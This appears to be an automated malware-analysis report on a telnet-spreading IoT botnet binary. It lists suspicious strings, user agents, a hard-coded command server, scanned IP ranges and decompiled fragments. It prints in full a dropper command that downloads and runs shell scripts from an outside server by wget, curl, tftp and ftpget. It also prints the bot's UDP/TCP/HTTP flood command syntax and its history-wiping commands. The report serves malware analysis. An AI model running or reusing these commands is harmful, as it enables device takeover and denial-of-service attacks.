=============================================================================
========	BINARY ID :c6f79ae0a59a983bd22d468a5f30eabb7927df6b==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2904
SUPSCPECTED LINES COUNT :180
SUPSCPECTED STRINGS COUNT (DISTINCT) :31
SUPSCPECTED STRINGS WEIGHT :120
SUSPECT STRING SCORE : [120 / 150] 80%
USER AGENTS STRINGS COUNT :9
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :198
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
dHFailed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
gd%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
gd%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
HTTPFLOOD
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
TOXICNET
/etc/rc.d/rc.local
fork failed\n
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
?/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/powerpc/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4074
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
sendHTTP2
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
__GI_inet_addr
__libc_connect
pids
sigprocmask
`\bᾐ᐀羀렀耸Ѐ뾀᐀왌舱H▞8Ȁᾰ᠀ᾀ쀀T㸄ͼ砃H跍恼砛ᾰᨀ羁밀㼹᠀सЀ捽硛Ѽ砃ｋ秲恼砛耯
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
gd%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
gd%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
208.67.1.179:23
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 84111
+++TOTAL FUNCTIONS 			:259
+++LINES PER FUNCTION RATIO 	: 324.752895752896
+++SUSPECTED LINES COUNT 	: 1576
+++SUSPECTED LINES RATIO 	: 1.87371449632034
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 84111
+++WHILE (TRUE) LINES			: 11826
+++WHILE (TRUE) LINES RATION		:14.0599921532261%
+++WHILE (TRUE) LOOPS COUNT		: 223
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v215 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    int32_t v215 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        int32_t v221 = __libc_open((int32_t)"/proc/net/route", 0); // 0x1000b718
    int32_t v210 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x1000b99c
    char * v212 = "/etc/rc.d/rc.local";
        v211 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v212 = "/etc/rc.conf";
                            int32_t v239 = __GI_fopen((int32_t)v212, (int32_t)&v238); // 0x1000bb10
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(0, (char *)-1);
int32_t _stdio_fopen(int32_t a1, char * a2) {
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v215 = __libc_open((int32_t)"/dev/null", a2); // 0x10011094
    int32_t v213 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v212); // 0x10013024
        int32_t v217 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v216); // 0x1001303c
    int32_t v215 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v214); // 0x1001466c
        result = __GI_fopen((int32_t)"/etc/config/hosts", v216);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
    char (*v173)[16] = "208.67.1.179:23";

        szprintf((int32_t)&v216, (int32_t)"112.5.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.165.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"85.3.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"37.158.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"95.9.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"41.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"58.71.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"104.55.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"78.186.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"78.189.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"221.120.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"88.5.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"41.254.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.20.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.47.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.57.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"45.117.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"101.51.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"137.59.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"1.56.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"1.188.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.204.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.0.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.8.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.50.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.54.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.98.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.112.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.192.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"36.32.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"36.248.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"39.64.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.4.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.48.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.52.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.56.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.63.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.84.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.176.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.224.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"42.176.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.253.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"163.53.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"62.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.245.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"62.255.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.25.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.54.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"27.255.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.204.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.24.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.191.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"81.100.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.188.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.189.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"94.174.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.160.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.161.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.162.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.163.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.164.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.165.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.166.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.167.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.168.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.169.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.170.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.171.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.172.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.173.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.174.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.175.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.176.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.177.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.178.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.179.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.180.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.181.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.182.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.183.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.184.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.185.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.186.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.187.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.188.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.189.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.190.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.191.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"45.121.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"45.120.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"45.115.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.230.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.240.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"43.245.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"41.174.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"49.118.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"78.188.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"45.127.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.30.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"14.33.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.16.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"202.44.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"116.93.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"91.83.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"41.253.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.173.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.190.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"146.88.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.196.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.178.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.45.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"183.223.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"116.71.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.44.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"110.235.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"124.253.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"211.237.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.175.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.173.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"178.93.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"111.9.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.174.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.160.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.161.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.162.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.163.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.164.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.165.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.166.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.167.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.168.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.169.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.17.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.18.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.19.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.20.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.21.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"123.22.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.252.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.253.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.254.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"222.255.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"37.247.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"41.208.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"183.220.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"175.201.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.198.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"183.223.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"50.205.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"88.248.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"88.105.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"88.247.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"85.105.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"188.3.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.203.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.55.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.220.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"183.233.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.242.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.198.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.14.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.195.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.203.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.214.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.218.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.225.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.228.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.231.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.60.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.248.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.253.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.255.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.35.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.49.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"103.62.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"144.48.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"163.47.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"163.53.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"223.29.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"59.153.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.176.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.175.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.177.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"113.183.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"202.164.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"203.134.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"210.56.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"49.156.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"203.210.%d.%d", (int32_t)v213);

